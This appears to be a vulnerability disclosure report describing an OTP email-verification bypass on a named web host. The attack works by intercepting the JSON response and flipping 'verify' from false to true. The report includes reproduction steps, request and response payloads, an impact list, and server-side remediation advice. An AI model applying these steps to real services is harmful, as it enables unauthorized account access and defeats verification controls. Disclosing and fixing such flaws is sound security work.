# Authentication Bypass - OTP Verification Manipulation

## Summary

I identified an Authentication Bypass vulnerability in the SecureApp email verification process.

The application accepts a 6-digit OTP (One-Time Password) via a POST request and returns a JSON response containing a `verify` field. By intercepting the server response and modifying the `verify` value from `false` to `true`, an attacker can bypass the OTP verification process and gain access to the application without providing a valid verification code.

This vulnerability occurs because the application trusts client-side values from the server response without performing proper server-side validation of the OTP. An attacker can use a web proxy (like Burp Suite or OWASP ZAP) to intercept the response and modify the JSON payload to grant access.

## Vulnerability Type

**Authentication Bypass (Client-Trusted Response Manipulation)**

## Vulnerable Parameters

```text
email
otp
verify (response parameter)
```

## Vulnerable URL

```text
https://koko-verify.kzlabs.in/?action=verify
```

## Steps to Reproduce

1. Navigate to the vulnerable SecureApp registration page.

2. Create an account with the following details:
   - **Full Name**: `ak`
   - **Email Address**: `xyz@gmail.com`
   - **Password**: `[any password]`

3. Submit the registration form.

4. A verification code (OTP) is sent to the provided email address.

5. Enter any 6-digit OTP (e.g., `111111`) in the verification form.

6. Intercept the verification request using Burp Suite, OWASP ZAP, or a similar proxy tool.

7. Observe the server response containing a JSON payload with `"verify":false`.

8. Modify the `verify` value from `false` to `true`.

9. Forward the modified response to the client.

10. Observe that the application grants access and displays the dashboard.

## Payloads Used

Original request:
```json
{
    "email": "xyz@gmail.com",
    "otp": "111111"
}
```

Original response:
```json
{
    "verify": false,
    "message": "Invalid OTP. Please try again."
}
```

Modified response:
```json
{
    "verify": true,
    "message": "Invalid OTP. Please try again."
}
```

## Proof of Concept

The application sends a POST request to the server with the email and OTP:

```http
POST /?action=verify HTTP/2
Host: koko-verify.kzlabs.in
Content-Type: application/json

{
    "email": "xyz@gmail.com",
    "otp": "111111"
}
```

The server responds with a JSON payload:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
    "verify": false,
    "message": "Invalid OTP. Please try again."
}
```

The vulnerability exists because the application trusts the `verify` value from the server response without performing additional server-side validation. By intercepting and modifying the response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
    "verify": true,
    "message": "Invalid OTP. Please try again."
}
```

The application grants access based solely on the modified `verify` value.

## Impact

This Authentication Bypass vulnerability allows an attacker to:

- Bypass email verification without a valid OTP
- Create fraudulent accounts with unverified email addresses
- Access restricted application features without proper authentication
- Potentially conduct account takeover attacks
- Bypass multi-factor authentication controls

## Recommendation

To mitigate this vulnerability:

- **Server-Side Validation**: Never trust client-side values for verification decisions. Perform all OTP validation on the server side.
  ```php
  // Server-side OTP validation
  if ($otpFromDatabase === $userSubmittedOtp) {
      $_SESSION['verified'] = true;
      $_SESSION['user_id'] = $user->id;
      // Return success status from server
  } else {
      // Return failure status from server
  }
  ```

- **Session Management**: Use secure server-side sessions to track verification status.

- **Response Integrity**: Do not include sensitive authentication decisions solely in client-accessible response bodies.

- **OTP Expiration**: Implement proper OTP expiration (e.g., 10-minute validity).

- **Rate Limiting**: Implement rate limiting on OTP verification endpoints.

- **Input Validation**: Validate all input parameters before processing.

- **Security Headers**: Implement security headers like `X-Content-Type-Options` and `X-Frame-Options`.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.
